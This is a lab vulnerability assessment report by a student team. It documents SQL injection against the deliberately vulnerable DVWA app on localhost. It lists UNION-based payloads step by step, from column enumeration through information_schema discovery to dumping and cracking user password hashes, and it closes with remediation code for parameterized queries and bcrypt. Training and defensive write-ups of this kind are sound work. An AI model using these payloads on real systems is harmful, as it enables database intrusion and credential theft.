# SQL Injection — Vulnerability Assessment Report
### Project KAVACH | Web Application Security Testing

---

| Field | Details |
|---|---|
| **Prepared By** | Team-9 |
| **Project** | Project KAVACH |
| **Target Application** | DVWA (Damn Vulnerable Web Application) |
| **Target URL** | `http://localhost:8081/vulnerabilities/sqli/` |
| **Vulnerability Class** | SQL Injection (Error-Based + UNION-Based) |
| **OWASP Category** | A03:2021 – Injection |
| **CVSSv3 Score** | 9.8 (Critical) |
| **CVSS Vector** | AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H |
| **Testing Date** | June 2025 |
| **Security Level Tested** | DVWA Low |

---

## Table of Contents

1. [Executive Summary](#1-executive-summary)
2. [Lab Environment](#2-lab-environment)
3. [Vulnerability Description](#3-vulnerability-description)
4. [Exploitation — Step by Step](#4-exploitation--step-by-step)
   - [Step 1 — Confirm Vulnerability](#step-1--confirm-vulnerability-error-based)
   - [Step 2 — Column Enumeration via ORDER BY](#step-2--column-enumeration-via-order-by)
   - [Step 3 — Confirm UNION SELECT](#step-3--confirm-union-select)
   - [Step 4 — Extract Current Database and User](#step-4--extract-current-database-and-user)
   - [Step 5 — Extract Database Version](#step-5--extract-database-version)
   - [Step 6 — Enumerate All Databases (Schemata)](#step-6--enumerate-all-databases-schemata)
   - [Step 7 — Enumerate Tables in DVWA Database](#step-7--enumerate-tables-in-dvwa-database)
   - [Step 8 — Enumerate Columns in Users Table](#step-8--enumerate-columns-in-users-table)
   - [Step 9 — Dump Credentials](#step-9--dump-credentials)
5. [Attack Chain Summary](#5-attack-chain-summary)
6. [Findings and Evidence](#6-findings-and-evidence)
7. [Impact Analysis](#7-impact-analysis)
8. [Root Cause Analysis](#8-root-cause-analysis)
9. [Remediation Recommendations](#9-remediation-recommendations)
10. [References](#10-references)

---

## 1. Executive Summary

During security testing of the DVWA (Damn Vulnerable Web Application) as part of **Project KAVACH**, a critical SQL Injection vulnerability was identified in the `User ID` input field of the SQL Injection module.

The vulnerability allows an unauthenticated attacker to manipulate SQL queries executed by the backend database (MariaDB), resulting in complete compromise of the `dvwa` database. The attacker was able to:

- Extract database metadata including version, name, and current user
- Enumerate all databases present on the server
- List all tables and columns within the target database
- Dump all user credentials including MD5-hashed passwords
- Recover plaintext passwords via hash lookup

This is classified as a **Critical** severity finding due to the complete data exposure and potential for full application compromise.

---

## 2. Lab Environment

| Component | Details |
|---|---|
| Attacker OS | Kali Linux (VirtualBox) |
| Target Application | DVWA on `localhost:8081` |
| Backend Database | MariaDB `10.1.26-MariaDB-0+deb9u1` |
| Database Name | `dvwa` |
| DB User | `app@localhost` |
| DVWA Security Level | Low |
| Testing Method | Manual — Browser-based injection |
| Browser | Mozilla Firefox |

---

## 3. Vulnerability Description

### What is SQL Injection?

SQL Injection (SQLi) is a web security vulnerability that allows an attacker to interfere with the queries that an application makes to its database. It allows an attacker to view data that they are not normally able to retrieve, including data belonging to other users, or any other data that the application itself is able to access.

### Vulnerability Location

The `id` GET parameter in the following URL is vulnerable:

```
http://localhost:8081/vulnerabilities/sqli/?id=[INPUT]&Submit=Submit
```

### Root Cause (Code Level)

The backend PHP code constructs queries using direct string concatenation without sanitization:

```php
// Vulnerable backend code
$id = $_GET['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
$result = mysql_query($query);
```

User-supplied `$id` is embedded directly into the query with no escaping, parameterization, or validation.

---

## 4. Exploitation — Step by Step

---

### Step 1 — Confirm Vulnerability (Error-Based)

**Objective:** Confirm that the input field is injectable by triggering a database error.

**Payload:**
```
'
```

**Full URL:**
```
http://localhost:8081/vulnerabilities/sqli/?id='&Submit=Submit
```

**Resulting Query (Backend):**
```sql
SELECT first_name, last_name FROM users WHERE user_id = '''
```

**Error Response:**
```
You have an error in your SQL syntax; check the manual that corresponds to your 
MariaDB server version for the right syntax to use near ''''' at line 1
```

**Inference:** The single quote breaks the SQL syntax, confirming that user input is directly interpolated into the query without escaping. The application is vulnerable to SQL Injection.

<p align="center">
  <img src="./Evidences/1.jpg" alt="Error-Based SQL Injection - Single Quote Triggers MariaDB Syntax Error" width="75%"><br>
  <em>Fig. 01: Error-Based SQL Injection — Single quote (') input on DVWA SQLi page returns a MariaDB syntax error, confirming the parameter is unsanitized and vulnerable</em>
</p>

---

### Step 2 — Column Enumeration via ORDER BY

**Objective:** Determine the number of columns returned by the original query. This is required before performing UNION-based injection.

**Payload 1**

```sql
1' ORDER BY 1-- '
```

**Result:** No error ✅

<p align="center">
  <img src="./Evidences/2.jpg" alt="Column Enumeration - ORDER BY 1 returns no error" width="60%"><br>
  <em>Fig. 02: Column Enumeration via ORDER BY — payload `1' ORDER BY 1-- '` executes with no error, confirming at least 1 column exists</em>
</p>

---

**Payload 2**

```sql
1' ORDER BY 2-- '
```

**Result:** No error ✅

<p align="center">
  <img src="./Evidences/3.jpg" alt="Column Enumeration - ORDER BY 2 returns no error" width="60%"><br>
  <em>Fig. 03: Column Enumeration via ORDER BY — payload `1' ORDER BY 2-- '` executes with no error, confirming at least 2 columns exist</em>
</p>

---

**Payload 3**

```sql
1' ORDER BY 3-- '
```

**Result:** Error ❌

<p align="center">
  <img src="./Evidences/4.jpg" alt="Column Enumeration - ORDER BY 3 returns error" width="60%"><br>
  <em>Fig. 04: Column Enumeration via ORDER BY — payload `1' ORDER BY 3-- '` returns an error, confirming the query returns exactly 2 columns</em>
</p>

**Inference:** The query returns exactly **2 columns**.

> The `-- '` at the end comments out the trailing quote in the original query, preventing a syntax error. 
---

### Step 3 — Confirm UNION SELECT

**Objective:** Confirm that UNION-based injection works and identify which columns are reflected in the output.

**Payload:**
```
2' union select 1,2 -- '
```

**Resulting Query (Backend):**
```sql
SELECT first_name, last_name FROM users WHERE user_id = '2'
UNION
SELECT 1, 2-- '
```

**Result:**
```
First name: Gordon    Surname: Brown     (original row)
First name: 1         Surname: 2         (injected row)
```

**Inference:** Both column positions are reflected in the output. UNION-based data extraction is confirmed viable.

<p align="center">
  <img src="./Evidences/5.jpg" alt="UNION SELECT confirms injectable columns" width="70%"><br>
  <em>Fig. 05: UNION-Based Injection — payload `2' union select 1,2 -- '` reflects values 1 and 2 in the First Name and Surname fields, confirming both column positions are injectable</em>
</p>

---

### Step 4 — Extract Current Database and User

**Objective:** Identify the active database name and the database user context the application is running under.

**Payload:**
```
2' union select database(), user() -- '
```

**Resulting Query (Backend):**
```sql
SELECT first_name, last_name FROM users WHERE user_id = '2'
UNION
SELECT database(), user()-- '
```

**Result:**

| Output Field | Value |
|---|---|
| First name | `dvwa` |
| Surname | `app@localhost` |

**Inference:**
- Active database: **dvwa**
- Application DB user: **app@localhost**

<p align="center">
  <img src="./Evidences/6.jpg" alt="Database and User Enumeration via UNION SELECT" width="70%"><br>
  <em>Fig. 06: Database Fingerprinting — payload `2' union select database(), user() -- '` reveals active database `dvwa` and application DB user `app@localhost`</em>
</p>

### Step 5 — Extract Database Version

**Objective:** Identify the exact database engine and version. Useful for targeting version-specific vulnerabilities.

**Payload:**
```
2' union select version(), database() -- '
```

**Result:**

| Output Field | Value |
|---|---|
| First name | 10.1.26-MariaDB-0+deb9u1 |
| Surname | dvwa |

**Inference:**
- DB Engine: **MariaDB**
- Version: **10.1.26** (Debian package)

<p align="center">
  <img src="./Evidences/7.jpg" alt="Database Version Fingerprinting via UNION SELECT" width="70%"><br>
  <em>Fig. 07: Database Version Disclosure — payload `2' union select version(), database() -- '` reveals the backend as MariaDB 10.1.26 (Debian deb9u1), enabling version-specific exploit targeting</em>
</p>

---

### Step 6 — Enumerate All Databases (Schemata)

**Objective:** List all databases present on the MariaDB server using `information_schema.schemata`.

**Payload:**
```
2' union SELECT schema_name, 2 FROM information_schema.schemata -- '
```

**Resulting Query (Backend):**
```sql
SELECT first_name, last_name FROM users WHERE user_id = '2'
UNION
SELECT schema_name, 2 FROM information_schema.schemata-- '
```

**Result — Databases Found:**

| Database | Description |
|---|---|
| `information_schema` | MySQL/MariaDB internal metadata |
| `dvwa` | Target application database |
| `mysql` | Core system database — stores server users and privileges |
| `performance_schema` | Server performance statistics |

<p align="center">
  <img src="./Evidences/8.jpg" alt="Database Enumeration via information_schema.schemata" width="70%"><br>
  <em>Fig. 08: Database Enumeration — payload `2' union SELECT schema_name, 2 FROM information_schema.schemata -- '` lists all databases on the server (information_schema, dvwa, mysql, performance_schema), exposing the full server scope beyond the target application</em>
</p>


### Step 7 — Enumerate Tables in DVWA Database

**Objective:** List all tables within the `dvwa` database to identify attack targets.

**Payload:**
```
2' union SELECT table_name, 2 FROM information_schema.tables WHERE table_schema = 'dvwa' -- '
```

**Result — Tables Found:**

| Table Name | Notes |
|---|---|
| `guestbook` | Stores guestbook entries |
| `users` | **Target** — likely stores credentials |

**Inference:** The `users` table is the primary target for credential extraction.

<p align="center">
  <img src="./Evidences/9.jpg" alt="Table Enumeration in dvwa Database" width="70%"><br>
  <em>Fig. 09: Table Enumeration — payload `2' union SELECT table_name, 2 FROM information_schema.tables WHERE table_schema = 'dvwa' -- '` lists tables within the `dvwa` database, identifying `users` as the primary target for credential extraction</em>
</p>

---

### Step 8 — Enumerate Columns in Users Table

**Objective:** Identify all column names and their data types within the `users` table to plan the credential dump query.

**Payload:**
```
2' union SELECT column_name, column_type FROM information_schema.columns WHERE table_schema = 'dvwa' and table_name = 'users' -- '
```

**Result — Columns Found:**

| Column Name | Data Type | Notes |
|---|---|---|
| `user_id` | `int(6)` | Primary key |
| `first_name` | `varchar(15)` | |
| `last_name` | `varchar(15)` | |
| `user` | `varchar(15)` | **Username** |
| `password` | `varchar(32)` | **Hash** — 32 chars = MD5 |
| `avatar` | `varchar(70)` | Profile image path |
| `last_login` | `timestamp` | |
| `failed_login` | `int(3)` | |

**Key Observation:** The `password` column has `varchar(32)` — exactly 32 characters, confirming **unsalted MD5 hashing**.

<p align="center">
  <img src="./Evidences/10.jpg" alt="Column Enumeration in users Table" width="70%"><br>
  <em>Fig. 10: Column Enumeration — payload reveals all columns in the `users` table; `password` is `varchar(32)`, confirming unsalted MD5 hashing</em>
</p>

---

### Step 9 — Dump Credentials

**Objective:** Extract all usernames and password hashes from the `users` table.

**Payload:**
```
2' union select user, password FROM users -- '
```

**Resulting Query (Backend):**
```sql
SELECT first_name, last_name FROM users WHERE user_id = '2'
UNION
SELECT user, password FROM users-- '
```

**Result — Credentials Dumped:**

| Username | MD5 Hash | Cracked Password |
|---|---|---|
| `admin` | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |
| `gordonb` | `e99a18c428cb38d5f260853678922e03` | `abc123` |
| `1337` | `8d3533d75ae2c3966d7e0d4fcc69216b` | `charley` |
| `pablo` | `0d107d09f5bbe40cade3de5c71e9e9b7` | `letmein` |
| `smithy` | `5f4dcc3b5aa765d61d8327deb882cf99` | `password` |

**Hash Cracking Method:** Known MD5 hash lookup via [CrackStation](https://crackstation.net)

**Additional Finding — Password Reuse:**
- `admin` and `smithy` share the identical hash `5f4dcc3b5aa765d61d8327deb882cf99` → both use password `password`
- This indicates **password reuse** across different accounts

<p align="center">
  <img src="./Evidences/11.jpg" alt="Full Credential Dump from users Table" width="70%"><br>
  <em>Fig. 11: Credential Dump — payload `2' union select user, password FROM users -- '` extracts all usernames and MD5 password hashes; admin and smithy share an identical hash, confirming password reuse</em>
</p>



## 5. Attack Chain Summary

```
[Step 1]  Single quote (') input
              → SQL syntax error confirmed
              → Vulnerability confirmed: Error-Based SQLi
                        ↓
[Step 2]  ORDER BY 1 / 2 / 3
              → Error at ORDER BY 3
              → Column count = 2
                        ↓
[Step 3]  UNION SELECT 1,2
              → Both values reflected in output
              → UNION-Based injection confirmed
                        ↓
[Step 4]  UNION SELECT database(), user()
              → Active DB: dvwa
              → DB User: app@localhost
                        ↓
[Step 5]  UNION SELECT version(), database()
              → DB Engine: MariaDB 10.1.26
                        ↓
[Step 6]  UNION SELECT schema_name FROM information_schema.schemata
              → 4 databases enumerated
                        ↓
[Step 7]  UNION SELECT table_name FROM information_schema.tables
              → Tables: guestbook, users
                        ↓
[Step 8]  UNION SELECT column_name, column_type FROM information_schema.columns
              → Columns: user_id, first_name, last_name, user, password (varchar(32)), ...
                        ↓
[Step 9]  UNION SELECT user, password FROM users
              → 5 credentials dumped (MD5)
              → All passwords cracked via hash lookup
              → Full database compromise achieved ✅
```

---

## 6. Findings and Evidence

### Finding Summary

| # | Finding | Severity | Status |
|---|---|---|---|
| F-01 | SQL Injection in `id` parameter | **Critical** | Confirmed & Exploited |
| F-02 | Full database credential dump | **Critical** | Confirmed |
| F-03 | Unsalted MD5 password hashing | **High** | Confirmed |
| F-04 | Password reuse across accounts | **Medium** | Confirmed |
| F-05 | Verbose SQL error messages exposed | **Medium** | Confirmed |
| F-06 | Database user with information_schema access | **Medium** | Confirmed |

### Evidence Files

| Folder | Content | Query Used |
|---|---|---|
| `1.Current Database/` | database() and user() extraction | `2' union select database(), user() -- '` |
| `2..Databases/` | All server databases via schemata | `2' union SELECT schema_name, 2 FROM information_schema.schemata -- '` |
| `3.Tables_DVWA/` | Tables in dvwa database | `2' union SELECT table_name, 2 FROM information_schema.tables WHERE table_schema = 'dvwa' -- '` |
| `4.Users_Table_Comn/` | Columns and types in users table | `2' union SELECT column_name, column_type FROM information_schema.columns WHERE table_schema = 'dvwa' and table_name = 'users' -- '` |

---

## 7. Impact Analysis

| Impact Category | Description |
|---|---|
| **Confidentiality** | Complete exposure of all database contents including user credentials |
| **Authentication** | All 5 user passwords recovered in plaintext — full account takeover possible |
| **Privilege Escalation** | Admin credentials (`admin:password`) obtained |
| **Data Integrity** | Attacker could INSERT, UPDATE, or DELETE records if write access is available |
| **Lateral Movement** | Access to `mysql` system database may expose server-level user accounts |
| **Scope** | All databases on the MariaDB server potentially accessible |

---

## 8. Root Cause Analysis

### Primary Cause — Lack of Parameterized Queries

The application builds SQL queries through direct string concatenation:

```php
// VULNERABLE — Direct concatenation
$id = $_GET['id'];
$query = "SELECT first_name, last_name FROM users WHERE user_id = '$id'";
```

This means any character the user submits — including SQL metacharacters like `'`, `--`, `;` — becomes part of the query logic itself rather than being treated as data.

### Secondary Causes

| Issue | Description |
|---|---|
| No Input Validation | The `id` parameter accepts any string without type or format checking |
| Verbose Error Messages | Full SQL error messages returned to the browser, aiding attacker enumeration |
| Weak Password Hashing | Unsalted MD5 used instead of bcrypt/argon2 — enables rapid hash cracking |
| Excessive DB Privileges | App user has read access to `information_schema` |

---

## 9. Remediation Recommendations

### Priority 1 — Fix SQL Injection (Critical)

**Use Prepared Statements / Parameterized Queries:**

```php
// SECURE — Parameterized query
$stmt = $pdo->prepare("SELECT first_name, last_name FROM users WHERE user_id = ?");
$stmt->execute([$id]);
$result = $stmt->fetchAll();
```

This ensures user input is **always treated as data**, never as SQL syntax.

---

### Priority 2 — Input Validation

```php
// Validate that id is a positive integer only
if (!filter_var($id, FILTER_VALIDATE_INT) || $id <= 0) {
    die("Invalid input.");
}
```

---

### Priority 3 — Suppress Verbose Error Messages

```php
// Disable in production
ini_set('display_errors', 0);
error_reporting(0);
```

Log errors server-side only — never expose them to the client.

---

### Priority 4 — Upgrade Password Hashing

```php
// Replace MD5 with bcrypt
$hashed = password_hash($password, PASSWORD_BCRYPT);

// Verify
if (password_verify($input, $hashed)) { ... }
```

---

### Priority 5 — Apply Least Privilege to DB User

```sql
-- Restrict app user — grant only what is needed
REVOKE ALL ON *.* FROM 'app'@'localhost';
GRANT SELECT, INSERT, UPDATE ON dvwa.users TO 'app'@'localhost';
GRANT SELECT, INSERT, UPDATE ON dvwa.guestbook TO 'app'@'localhost';
```

---

### Remediation Summary Table

| Finding | Recommended Fix | Priority |
|---|---|---|
| SQL Injection | Parameterized queries / Prepared statements | **Critical** |
| Input not validated | Server-side whitelist validation | High |
| Verbose error messages | Disable display_errors in production | Medium |
| MD5 password hashing | Migrate to bcrypt / argon2 | High |
| Password reuse | Enforce password uniqueness policy | Medium |
| Excess DB privileges | Apply principle of least privilege | Medium |

---

## 10. References

| Resource | URL |
|---|---|
| OWASP SQL Injection | https://owasp.org/www-community/attacks/SQL_Injection |
| OWASP A03:2021 Injection | https://owasp.org/Top10/A03_2021-Injection/ |
| OWASP SQLi Prevention Cheat Sheet | https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html |
| DVWA Project | https://github.com/digininja/DVWA |
| CWE-89: SQL Injection | https://cwe.mitre.org/data/definitions/89.html |
| CVSSv3 Calculator | https://www.first.org/cvss/calculator/3.1 |
| CrackStation (Hash Lookup) | https://crackstation.net |

---

> **Disclaimer:** This assessment was conducted in a controlled lab environment on intentionally vulnerable software (DVWA) for educational purposes only, as part of **Project KAVACH** cybersecurity training. All findings are limited to the local lab environment and do not represent any real-world systems.

---

*End of Report — Project KAVACH | megha22knit*
